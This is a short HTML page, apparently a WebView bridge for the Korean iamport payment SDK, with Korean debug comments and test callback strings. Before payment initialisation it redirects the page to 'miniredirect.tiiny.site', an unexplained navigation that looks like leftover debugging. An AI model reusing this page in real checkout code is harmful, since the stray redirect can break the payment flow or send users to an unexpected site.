<html>
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
<!-- 현재 콜백은 불필요 할 듯 onPageFinished 쓰니까..! -->
    <script type="text/javascript">
        console.log("Wait cdn-iamport-sdk...");
        document.addEventListener('DOMContentLoaded', () => {
            console.log("Load finish cdn-iamport-sdk...");

            var userCode = IAMPORT.getUserCode()
            var impRequest = IAMPORT.getRequestParams()

            function callback(response) {
               IAMPORT.customCallback(JSON.stringify(response))
             }
           IAMPORT.customCallback("그냥 테스트여1")
           window.IAMPORT.customCallback("그냥 테스트여2")
           IAMPORT.customCallback("그냥 테스트여3")

            window.location.href = 'miniredirect.tiiny.site';

            IMP.init(userCode);
            IMP.request_pay(JSON.parse(impRequest), callback);
        });
    </script>
    <script defer type="text/javascript" src="https://code.jquery.com/jquery-latest.min.js"></script>
    <script defer type="text/javascript" src="https://cdn.iamport.kr/js/iamport.payment-1.1.8.js"></script>
</body>
</html>